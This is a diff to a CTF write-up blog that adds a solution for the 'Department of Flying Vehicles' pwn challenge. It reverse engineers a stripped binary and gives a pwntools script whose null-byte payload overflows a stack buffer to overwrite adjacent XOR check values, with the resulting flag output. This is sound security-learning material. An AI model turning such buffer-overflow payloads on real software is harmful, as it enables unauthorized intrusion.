@@ -18,8 +18,8 @@ These are writeups to challenges I solved for this CTF.
 
 ## Solved
 
-| Welcome Challenges    | Web     | Reverse Engineering     | Crypto    |
-| [Welcome](#welcome)   | [Welcome to Earth](#welcome-to-earth) | [Dank Engine](#dank-engine--100) | [Harvesting Season](#harvesting-season)
+| Welcome Challenges    | Web     | Reverse Engineering     | Crypto    | PWN                               |
+| [Welcome](#welcome)   | [Welcome to Earth](#welcome-to-earth) | [Dank Engine](#dank-engine--100) | [Harvesting Season](#harvesting-season) | [Department of Flying Vehicles](#department-of-flying-vehicles) |
 | [Discord Flag](#discord-flag)| | [Chugga Chugga](#chugga-chugga) | |
 |---
 | | | | |
@@ -1065,3 +1065,130 @@ Instead of using Python, once we figured out the key, we could have used somethi
 
 ![]({{ site.baseurl }}/img/cyberchef_xor.png)
 
+
+# PWN
+
+## Department of Flying Vehicles
+> Dave ruined the code for the DFV starship registry system. Please help fix it.
+>
+> nc pwn.ctf.b01lers.com 1001
+>
+> [0da7785b7b6125beabc9b3eba9ae68ff](https://storage.googleapis.com/b0ctf-deploy/dfv.tgz)
+
+If we connect to that endpoint:
+
+```
+nc pwn.ctf.b01lers.com 1001
+Dave has ruined our system. He updated the code, and now he even has trouble checking his own liscense!
+If you can please make it work, we'll reward you!
+
+Welcome to the Department of Flying Vehicles.
+Which liscense plate would you like to examine?
+ > AAAAAAAAAA
+Error.
+```
+
+Downloading the attached file gives us a single executable: `dfv`.
+
+Checking that file:
+
+```
+file dfv
+dfv: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=571aba88a3699a3b83be95160b3230cbf65cec69, stripped
+```
+
+Bummer, it's stripped. But, we see it's a 64-bit dynamically linked executable.
+
+Checking it's securities:
+
+```python
+checksec dfv
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /Users/georgepickering/.pwntools-cache-3.8/update to 'never'.
+[*] You have the latest version of Pwntools (4.0.1)
+[*] '/Users/georgepickering/Downloads/dfv/dfv'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+If we open it up in [Cutter](https://cutter.re/), we can find the `main` function. I've enabled Cutter's Decompiled (via a Ghidra plugin), Dissasembled, and Function Graph views:
+
+![]({{ site.baseurl }}/img/dfv/cutter_main.png)
+
+I've also renamed some of the local variables to be indicative of what they are.
+
+In summary, it has two static values, one of which is the string "COOLDAV", and the other I renamed `xor_key_against_cooldav`. It XORs the two, and stores that in a variable (I've renamed to `cooldav_against_xor_key`).
+
+Then, it takes our user input (I've renamed to `user_input`), and XOR's that against the `cooldav_against_xor_key` variable).
+
+Then, if that result is equal to the original `cooldav_against_xor_key`, it continues, otherwise it quits.
+
+We know [XOR is it's own inverse (still)](https://bigpick.github.io/TodayILearned/articles/2020-03/xor-inverse), so in order for this to work, we'd need to pass COOLDAV.
+
+Once satisfied, it continues (visible by the top most green arrow here, stemming from the initial main block):
+
+![]({{ site.baseurl }}/img/dfv/cutter_main_pass_check.png)
+
+But wait! Now that we're here, if our input matches COOLDAV (which it had to have, for us to get to this point), it just prints hello and quits!
+
+So, we need to satisfy the initial check to get into this block, but then also fail the COOLDAV check, to get the flag.
+
+We can see from the Cutter output that our input is sitting at `rbp-0x20`, and then the xor variables sit immediately after it:
+
+
+![]({{ site.baseurl }}/img/dfv/cutter_main_def.png)
+
+Which means that we'd need to pass 16 characters from the beginning of our input to get to the `cooldav_against_xor_key`:
+
+```python
+>>> 0x20 - 0x10
+16
+```
+
+So, we write 8 chars for our legitimate input, then 8 more chars for the key, then 8 more chars for the result of "COOLDAV" ^ key.
+
+In order to satisfy the if checks to get to the flag, we need our input XOR'ed with COOLDAV to match whatever we give it for the result.
+
+An easy way to do this is just set all bytes to null:
+
+```python
+#!/usr/bin/env python
+from pwn import *
+
+context.bits= '64'
+context.endian= 'little'
+#context.log_level = 'debug'
+
+conn = remote('pwn.ctf.b01lers.com', 1001)
+
+conn.recvuntil(" > ")
+payload = p64(0x0)*24
+conn.sendline(payload)
+while 1<2:
+    try:
+        print(conn.recvlineS())
+    except EOFError as e:
+        break
+```
+Results:
+```
+python dfv_pwn.py
+[+] Opening connection to pwn.ctf.b01lers.com on port 1001: Done
+b"Thank you so much! Here's your reward!\n"
+b'pctf{sp4c3_l1n3s_R_sh0r7!}\n'
+b'*** stack smashing detected ***: <unknown> terminated\n'
+b'/home/dfv/wrapper.sh: line 2:  8065 Aborted                 (core dumped) ./dfv\n'
+```
+
+Flag: `pctf{sp4c3_l1n3s_R_sh0r7!}`
+
+(Alternatively, we could also post 8 chars, 8 null-bytes, and then the same 8 chars, as that would essentially make the XOR a nop, like)
+
+```python
+# ...
+payload = "a"*8 + "\00"*8 + "a"*8
+# ...
+```
